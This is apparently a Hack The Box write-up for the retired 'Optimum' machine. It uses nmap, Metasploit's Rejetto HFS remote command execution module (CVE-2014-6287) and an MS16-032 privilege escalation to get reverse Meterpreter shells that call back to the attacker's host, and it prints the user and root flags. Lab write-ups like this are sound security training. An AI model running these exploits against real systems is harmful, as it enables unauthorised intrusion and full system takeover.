@@ -1,0 +1,172 @@
+I"�3<p>Optimum is a easy level retired CTF from Hack the Box. To root this machine, I gained initial access by exploiting a remote command execution vulnerability (CVE-2014-6287) and escalated privileges to root through a local windows privilege escalation vulnerability (CVE-2016-0099).</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>To start, I used nmap to enumerate open services and running ports.  The resulting output revealed the target server was running the HttpFileServer, version 2.3.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/OptimumRETIRED]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">--top-ports</span> 200 10.10.10.8                                                                                           1 ⨯
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-04 20:01 EST
+Nmap scan report <span class="k">for </span>10.10.10.8
+Host is up <span class="o">(</span>0.026s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 199 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2012 or Windows Server 2012 R2 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2012 R2 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows 7 Professional <span class="o">(</span>87%<span class="o">)</span>, Microsoft Windows 8.1 Update 1 <span class="o">(</span>86%<span class="o">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span class="o">(</span>86%<span class="o">)</span>, Microsoft Windows 7 or Windows Server 2008 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2008 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2008 R2 or Windows 8.1 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2008 R2 SP1 or Windows 8 <span class="o">(</span>85%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   27.39 ms 10.10.14.1
+2   27.77 ms 10.10.10.8
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.00 seconds
+</code></pre></div></div>
+
+<h2 id="vulnerability-identification">Vulnerability Identification</h2>
+
+<p>Research into the HttpFileServer version 2.3 revealed its vulnerable to CVE-2014-6287, a remote command execution  vulnerability which has several public exploits available. One of these exploits is available in a metasploit module, so I launched metasploit and configured the necessary options.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> search CVE-2014-6287
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                   Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                   <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.13:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using URL: http://0.0.0.0:8081/IfzP0QI2SL
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Local IP: http://192.168.232.8:8081/IfzP0QI2SL
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server started.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending a malicious request to /
+/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
+/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload request received: /IfzP0QI2SL
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175174 bytes<span class="o">)</span> to 10.10.10.8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.13:4444 -&gt; 10.10.10.8:49162<span class="o">)</span> at 2021-03-04 20:09:00 <span class="nt">-0500</span>
+
+<span class="o">[!]</span> Tried to delete %TEMP%<span class="se">\O</span>MHaX.vbs, unknown result
+
+
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server stopped.
+
+meterpreter <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<h2 id="locate-user-flag">Locate User Flag</h2>
+
+<p>Using the meterpreter shell, I located the user flag and read its contents.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> <span class="nb">ls
+</span>Listing: C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop
+<span class="o">================================</span>
+
+Mode              Size    Type  Last modified              Name
+<span class="nt">----</span>              <span class="nt">----</span>    <span class="nt">----</span>  <span class="nt">-------------</span>              <span class="nt">----</span>
+40777/rwxrwxrwx   0       <span class="nb">dir   </span>2021-03-11 05:11:20 <span class="nt">-0500</span>  %TEMP%
+100666/rw-rw-rw-  282     fil   2017-03-18 07:57:16 <span class="nt">-0400</span>  desktop.ini
+100777/rwxrwxrwx  760320  fil   2014-02-16 06:58:52 <span class="nt">-0500</span>  hfs.exe
+100444/r--r--r--  32      fil   2017-03-18 08:13:18 <span class="nt">-0400</span>  user.txt.txt
+
+meterpreter <span class="o">&gt;</span> <span class="nb">cat </span>user.txt.txt
+d0c39409d7b994a9a1389ebf38ef5f73
+</code></pre></div></div>
+
+<h2 id="post-exploitation-enumeration">Post Exploitation Enumeration</h2>
+
+<p>The CVE-2014-6287 exploit opened the meterpreter shell as the kostas user. To read the contents of the Admin flag, I would need to escalate to SYSTEM privilege. First, I attempted the <code class="language-plaintext highlighter-rouge">getsystem</code> meterpreter command, but this failed. I started to gather additional details about the target, starting with the meterpreter <code class="language-plaintext highlighter-rouge">sysinfo</code> command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> sysinfo
+Computer        : OPTIMUM
+OS              : Windows 2012 R2 <span class="o">(</span>6.3 Build 9600<span class="o">)</span><span class="nb">.</span>
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<p>Researching for local privilege escalation vulnerabilities specific for Windows 2012 R2 (6.3 Build 9600) revealed CVE-2016-0099. Fortunately, this too has a metasploit module available. I configured the module and launched the exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.13:4441 
+<span class="o">[</span>+] Compressed size: 1016
+<span class="o">[!]</span> Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing payload file, C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\K</span>qxoHA.ps1...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Compressing script contents...
+<span class="o">[</span>+] Compressed size: 3592
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| <span class="nb">.</span> |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       <span class="o">[</span>by b33f -&gt; @FuzzySec]
+
+<span class="o">[</span>?] Operating system core count: 2
+<span class="o">[&gt;]</span> Duplicating CreateProcessWithLogonW handle
+<span class="o">[</span>?] Done, using thread handle: 2112
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing out privileged impersonation token..
+
+<span class="o">[</span>?] Thread belongs to: svchost
+<span class="o">[</span>+] Thread suspended
+<span class="o">[&gt;]</span> Wiping current impersonation token
+<span class="o">[&gt;]</span> Building SYSTEM impersonation token
+<span class="o">[</span>?] Success, open SYSTEM token handle: 2080
+<span class="o">[</span>+] Resuming thread..
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing out SYSTEM shell..
+
+<span class="o">[&gt;]</span> Duplicating SYSTEM token
+<span class="o">[&gt;]</span> Starting token race
+<span class="o">[&gt;]</span> Starting process race
+<span class="o">[!]</span> Holy handle leak Batman, we have a SYSTEM shell!!
+
+PykxFdTyo5bVOiBbBCJ1ZoZo9QIdtpa6
+<span class="o">[</span>+] Executed on target machine.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175174 bytes<span class="o">)</span> to 10.10.10.8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 2 opened <span class="o">(</span>10.10.14.13:4441 -&gt; 10.10.10.8:49166<span class="o">)</span> at 2021-03-04 20:41:02 <span class="nt">-0500</span>
+<span class="o">[</span>+] Deleted C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\K</span>qxoHA.ps1
+
+meterpreter <span class="o">&gt;</span> shell
+</code></pre></div></div>
+
+<h2 id="locate-root-flag">Locate Root Flag</h2>
+
+<p>Using the meterpreter <code class="language-plaintext highlighter-rouge">shell</code> command, I dropped into the windows cmd shell and searched manually for the root flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+18/03/2017  02:14 ��    &lt;DIR&gt;          <span class="nb">.</span>
+18/03/2017  02:14 ��    &lt;DIR&gt;          ..
+18/03/2017  02:14 ��                32 root.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             32 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>  31.899.729.920 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
+<span class="nb">type </span>root.txt
+51ed1b36553c8461f4552c2e92b3eeed
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+:ET
